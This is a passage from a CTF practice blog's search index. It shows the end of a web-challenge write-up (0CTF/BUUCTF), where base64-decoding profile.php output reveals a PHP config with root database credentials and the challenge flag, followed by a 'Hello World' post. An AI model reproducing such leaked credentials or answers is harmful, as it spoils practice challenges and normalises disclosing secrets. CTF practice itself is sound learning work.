<p>访问profile.php</p>
<p><img src="../pic/2.png" alt="2"></p>
<p>将base64解码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$config[<span class="string">'hostname'</span>] = <span class="string">'127.0.0.1'</span>;</span><br><span class="line">$config[<span class="string">'username'</span>] = <span class="string">'root'</span>;</span><br><span class="line">$config[<span class="string">'password'</span>] = <span class="string">'qwertyuiop'</span>;</span><br><span class="line">$config[<span class="string">'database'</span>] = <span class="string">'challenges'</span>;</span><br><span class="line">$flag = <span class="string">'flag&#123;94b7c4b2-866d-4189-9b0a-abdf22990071&#125;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>刷题记录</category>
      </categories>
      <tags>
        <tag>ctf</tag>
        <tag>web</tag>
        <tag>0CTF</tag>
        <tag>buuctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2019/12/19/hello-world/</url>
    <content><![CDATA[<p>第一次弄好自己的博客，之前都是在onenote上写的，现在准备慢慢向博客转移</p>
]]></content>
  </entry>
</search>
